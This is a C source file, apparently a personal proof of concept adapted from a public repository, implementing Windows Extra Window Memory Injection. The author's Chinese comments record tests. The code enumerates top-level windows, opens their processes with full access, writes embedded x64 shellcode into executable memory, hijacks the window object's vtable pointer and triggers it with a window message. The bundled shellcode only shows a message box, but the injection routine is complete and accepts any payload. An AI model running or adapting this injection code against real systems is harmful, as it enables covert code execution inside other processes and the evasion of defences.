/**
https://github.com/wojtekgoo/Infosec/blob/master/T1181%20-%20Extra%20Window%20Memory%20Injection/T1181%20-%20EWMI.c

1、测试发现只有explorer的消息才能执行到poc，其他的比如notepad的子窗口是无法执行的。
2、创建进程测试失败，但是messagebox弹窗的shellcode执行成功
3、测试发现，只有explorer进程和taskmgr这俩进程会影响shellcode执行，但是task这个中断后不会自己起来，子窗口基本都无效
4、多开几个窗口，说不准就有哪个窗口能用，taskmgr并不一定能用


*   核心思想兼容，都是针对iunknown结构进行修改，这俩改的是EWM里的quertinterface指针L"tooltips_class32", L"ForegroundStaging",
*	ewmi改的是第四个指针，本质都一样，不重复实现。
*/

#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

HWND hwndList[256];
int hwndCount = 0;


// extra window memory bytes for Shell_TrayWnd
typedef struct _ctray_vtable {
	ULONG_PTR vTable;    // change to remote memory address
	ULONG_PTR AddRef;    // add reference
	ULONG_PTR Release;   // release procedure
	ULONG_PTR WndProc;   // window procedure (change to payload)
} CTray;

typedef struct _ctray_obj {
	CTray* vtbl;
} CTrayObj;

UCHAR shellcode_msg[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

PCHAR GetNameByPid(DWORD pid)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &pe)) {
		do {
			if (pe.th32ProcessID == pid)
			{
				return pe.szExeFile;
			}
		} while (Process32Next(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return NULL;
}

/*
// 原本的写explorer的 extraBytes_explorer
VOID extraBytes_explorer(LPVOID payload, DWORD payloadSize) {
	LPVOID    cs, ds;
	CTray     ct;
	ULONG_PTR ctp;
	HWND      hw;
	HANDLE    hp;
	DWORD     pid;
	SIZE_T    wr;

	// 1. Obtain a handle for the shell tray window
	hw = FindWindowW(L"Shell_TrayWnd", NULL);

	// 2. Obtain a process id for explorer.exe
	GetWindowThreadProcessId(hw, &pid);

	// 3. Open explorer.exe
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	// 4. Obtain pointer to the current CTray object
	ctp = GetWindowLongPtr(hw, 0);

	// 5. Read address of the current CTray object
	ReadProcessMemory(hp, (LPVOID)ctp,
		(LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);

	// 6. Read three addresses from the virtual table
	ReadProcessMemory(hp, (LPVOID)ct.vTable,
		(LPVOID)&ct.AddRef, sizeof(ULONG_PTR) * 3, &wr);

	// 7. Allocate RWX memory for code
	cs = VirtualAllocEx(hp, NULL, payloadSize,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// 8. Copy the code to target process
	WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
	printf("shellcode: %p\n", cs);

	getchar();

	// 9. Allocate RW memory for the new CTray object
	ds = VirtualAllocEx(hp, NULL, sizeof(ct),
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 10. Write the new CTray object to remote memory
	ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
	ct.WndProc = (ULONG_PTR)cs;

	WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr);

	// 11. Set the new pointer to CTray object
	SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);

	// 12. Trigger the payload via a windows message
	// 随便发个什么消息，都会触发执行，并且执行的次数不固定，然后会崩溃
	//PostMessage(hw, WM_CLOSE, 0, 0); WM_PAINT
	PostMessage(hw, WM_PAINT, 0, 0);

	Sleep(5 * 1000);

	// 13. Restore the original CTray object
	SetWindowLongPtr(hw, 0, ctp);

	// 14. Release memory and close handles
	//VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	//VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}

// 自定义测试的
VOID extraBytes(LPVOID payload, DWORD payloadSize)
{
	LPVOID    cs, ds;
	CTray     ct;
	ULONG_PTR ctp;
	HWND      hw;
	HANDLE    hp;
	DWORD     pid;
	SIZE_T    wr;

	// 尝试一下子窗口
	//HWND hw1 = FindWindowW(L"Notepad", L"无标题 - 记事本");
	//hw = FindWindowExW(hw1, NULL, L"Edit", NULL);

	hw = FindWindowW(L"tooltips_class32", NULL);


	if (hw == NULL)
	{
		printf("FindWindow( Shell_TrayWnd , NULL); rund failed: %d\n", GetLastError());
	}

	// 2. Obtain a process id for explorer.exe
	GetWindowThreadProcessId(hw, &pid);

	// 3. Open explorer.exe
	hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("process id : %d\n", pid);
	// 4. Obtain pointer to the current CTray object
	ctp = GetWindowLongPtrW(hw, 0);
	if (!ctp)
	{
		printf("GetWindowLongPtr(hw, 0); error code : %d\n", GetLastError());
		return;
	}

	// 5. Read address of the current CTray object
	ReadProcessMemory(
		hp,
		(LPVOID)ctp,
		(LPVOID)&ct.vTable,
		sizeof(ULONG_PTR),
		&wr
	);

	// 6. Read three addresses from the virtual table
	ReadProcessMemory(
		hp,
		(LPVOID)ct.vTable,
		(LPVOID)&ct.AddRef,
		sizeof(ULONG_PTR) * 3,
		&wr
	);

	// 7. Allocate RWX memory for code
	cs = VirtualAllocEx(
		hp,
		NULL,
		payloadSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	// 8. Copy the code to target process

	WriteProcessMemory(
		hp,
		cs,
		payload,
		payloadSize,
		&wr
	);

	printf("wpm shellcode to %p \n", cs);

	// 9. Allocate RW memory for the new CTray object
	ds = VirtualAllocEx(
		hp,
		NULL,
		sizeof(ct),
		MEM_COMMIT | MEM_RESERVE,
		//PAGE_READWRITE
		PAGE_EXECUTE_READWRITE
	);

	// 10. Write the new CTray object to remote memory
	ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
	ct.WndProc = (ULONG_PTR)cs;

	WriteProcessMemory(
		hp,
		ds,
		&ct,
		sizeof(ct),
		&wr
	);

	// 11. Set the new pointer to CTray object
	if (!SetWindowLongPtrW(hw, 0, (ULONG_PTR)ds))
	{
		printf("SetWindowLongPtrW error %d\n", GetLastError());
	}

	getchar();

	// 12. Trigger the payload via a windows message
	// PostMessage(hw, WM_CLOSE, 0, 0);
	//PostMessage(hw, WM_ENABLE, 0, 0);
	PostMessage(hw, WM_PAINT, 0, 0);
	//SendNotifyMessage(hw, WM_CLOSE, 0, 0);


	// 13. Restore the original CTray objectZ
	SetWindowLongPtr(hw, 0, ctp);

	// 14. Release memory and close handles
	VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
	VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

	CloseHandle(hp);
}
*/

VOID extraBytes_any(LPVOID payload, DWORD payloadSize)
{
	LPVOID    cs, ds;
	CTray     ct;
	ULONG_PTR ctp;
	HANDLE    hp;
	DWORD     pid;
	SIZE_T    wr;

	for (int i = 0; i < hwndCount; i++)
	{
		HWND hw = hwndList[i];
		if (hw == NULL)
		{
			printf("FindWindow( Shell_TrayWnd , NULL); rund failed: %d\n", GetLastError());
		}

		// 2. Obtain a process id for explorer.exe
		GetWindowThreadProcessId(hw, &pid);

		PCHAR procName = GetNameByPid(pid);
		printf("current hwnd %d | pid name %s \n", (DWORD)hw, procName);

		// 手动判断有哪些要注入的进程，排除了explorer进程
		getchar();

		if (!_stricmp(procName, "explorer.exe") || !procName)
		{
			continue;
		}

		// 3. Open explorer.exe
		hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
		printf("process id : %d\n", pid);

		// 4. Obtain pointer to the current CTray object
		ctp = GetWindowLongPtrW(hw, 0);
		if (!ctp)
		{
			printf("GetWindowLongPtr(hw, 0); error code : %d\n", GetLastError());
			continue;
		}

		// 5. Read address of the current CTray object
		ReadProcessMemory(
			hp,
			(LPVOID)ctp,
			(LPVOID)&ct.vTable,
			sizeof(ULONG_PTR),
			&wr
		);

		// 6. Read three addresses from the virtual table
		ReadProcessMemory(
			hp,
			(LPVOID)ct.vTable,
			(LPVOID)&ct.AddRef,
			sizeof(ULONG_PTR) * 3,
			&wr
		);

		// 7. Allocate RWX memory for code
		cs = VirtualAllocEx(
			hp,
			NULL,
			payloadSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		// 8. Copy the code to target process
		WriteProcessMemory(
			hp,
			cs,
			payload,
			payloadSize,
			&wr
		);

		printf("wpm shellcode to %p \n", cs);

		// 9. Allocate RW memory for the new CTray object
		ds = VirtualAllocEx(
			hp,
			NULL,
			sizeof(ct),
			MEM_COMMIT | MEM_RESERVE,
			//PAGE_READWRITE
			PAGE_EXECUTE_READWRITE
		);

		// 10. Write the new CTray object to remote memory
		ct.vTable = (ULONG_PTR)ds + sizeof(ULONG_PTR);
		ct.WndProc = (ULONG_PTR)cs;

		WriteProcessMemory(
			hp,
			ds,
			&ct,
			sizeof(ct),
			&wr
		);

		// 11. Set the new pointer to CTray object
		if (!SetWindowLongPtrW(hw, 0, (ULONG_PTR)ds))
		{
			printf("SetWindowLongPtrW error %d\n", GetLastError());
		}

		// 12. Trigger the payload via a windows message
		// PostMessage(hw, WM_CLOSE, 0, 0);
		//PostMessage(hw, WM_ENABLE, 0, 0);
		PostMessage(hw, WM_PAINT, 0, 0);
		//SendNotifyMessage(hw, WM_CLOSE, 0, 0);

		Sleep(1 * 1000);

		// 13. Restore the original CTray objectZ
		SetWindowLongPtr(hw, 0, ctp);

		// 14. Release memory and close handles
		//VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
		//VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

		CloseHandle(hp);
	}
}

// 获取窗口类信息并检查条件
BOOL CheckWindowConditions1(HWND hwnd)
{
	WNDCLASSEX wc = { 0 };
	char className[256] = { 0 };
	ATOM classAtom;
	LONG_PTR windowData;

	// 获取类名
	if (GetClassNameA(hwnd, className, sizeof(className)) == 0) {
		return FALSE;
	}

	// printf("current class name %s \nhwnd %d\n", className, (DWORD)hwnd);

	// 获取类的原子值
	classAtom = (ATOM)GetClassLongPtrA(hwnd, GCW_ATOM);
	if (classAtom == 0) {
		return FALSE;
	}


	// 这里不检查窗口类类型，用来看看这个会不会影响到shellcode的执行，还是加上吧
	// 通过原子值获取完整的窗口类信息
	wc.cbSize = sizeof(WNDCLASSEX);
	if (!GetClassInfoExA(GetModuleHandleA(NULL), (LPCSTR)(ULONG_PTR)classAtom, (LPWNDCLASSEXA)&wc)) {
		// 如果从当前模块获取失败，尝试从窗口的实例获取
		HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrA(hwnd, GWLP_HINSTANCE);
		if (hInst && !GetClassInfoExA(hInst, className, (LPWNDCLASSEXA)&wc))
		{
			// 最后尝试直接用类名获取
			if (!GetClassInfoExA(NULL, className, (LPWNDCLASSEXA)&wc))
			{
				return FALSE;
			}
		}
	}

	// 检查类样式是否包含CS_DBLCLKS
	if (!(wc.style & CS_DBLCLKS)) {
		return FALSE;
	}


	// 检查窗口字节偏移0位置是否有数据
	windowData = GetWindowLongPtrA(hwnd, 0);
	if (windowData == 0) {

		return FALSE;

	}

	return TRUE;
}

BOOL CALLBACK EnumWindowsProc1(HWND hwnd, LPARAM lParam)
{
	if (CheckWindowConditions1(hwnd))
	{
		int* count = (int*)lParam;
		(*count)++;

		printf("\n找到符合条件的窗口 #%d:\n", *count);

		if (hwndCount < 256)
		{
			hwndList[hwndCount++] = hwnd;  // 模拟 append
			printf("找到符合条件的窗口 #%d: HWND = 0x%p\n", hwndCount, hwnd);
		}
		else {
			printf("超出最大窗口保存数量限制！\n");
		}

	}

	return TRUE; // 继续枚举
}

VOID extraBytes_all_connect()
{
	INT count = 0;
	printf("\n正在枚举顶级窗口...\n");

	EnumWindows(EnumWindowsProc1, (LPARAM)&count);

	printf("total 符合条件的 hwnd %d\n", hwndCount);


	printf("\n准备向窗口中注入shellcode\n");

	extraBytes_any(shellcode_msg, sizeof(shellcode_msg));

}


int EWMIExecute()
{
	//extraBytes(shellcode, sizeof(shellcode));
	extraBytes_all_connect();
	return 0;
}